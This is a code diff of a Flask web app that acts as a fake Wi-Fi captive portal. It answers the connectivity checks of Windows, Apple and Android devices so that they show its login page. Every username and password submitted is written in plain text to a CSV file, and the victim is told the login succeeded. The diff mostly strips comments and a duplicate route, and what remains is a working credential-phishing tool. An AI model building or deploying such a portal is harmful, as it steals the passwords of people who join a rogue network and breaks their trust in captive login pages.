@@ -1,31 +1,23 @@
-
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template
 import csv
 import os
 
 app = Flask(__name__)
 
-# The name of the file to save credentials to
 LOG_FILE = os.path.join(os.path.dirname(__file__), '..', 'data', 'logins.csv')
+
 @app.route('/connecttest.txt')
 def connecttest():
     return "OK", 200
 
 @app.route('/')
 def home():
-    """Serves the login page."""
     return render_template('index.html')
-
-# Answer Windows captive-portal check
-@app.route('/connecttest.txt')
-def connecttest():
-    return "OK", 200
 
 @app.route('/ncsi.txt')
 def ncsi():
     return "OK", 200
 
-# Answer Apple/Android captive-portal check
 @app.route('/hotspot-detect.html')
 @app.route('/success.html')
 @app.route('/generate_204')
@@ -34,11 +26,9 @@ def portal_redirect():
 
 @app.route('/login', methods=['POST'])
 def login():
-    """Handles the login form submission."""
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # Save the credentials to the CSV file
     with open(LOG_FILE, 'a', newline='') as f:
         writer = csv.writer(f)
         writer.writerow([username, password])
@@ -46,11 +36,9 @@ def login():
     return "Login successful. Thank you."
 
 if __name__ == '__main__':
-    # Ensure the log file exists
     if not os.path.exists(LOG_FILE):
         with open(LOG_FILE, 'w', newline='') as f:
             writer = csv.writer(f)
             writer.writerow(['Username', 'Password'])
 
-    # Run the app on all available network interfaces
     app.run(host='0.0.0.0', port=80, debug=False)
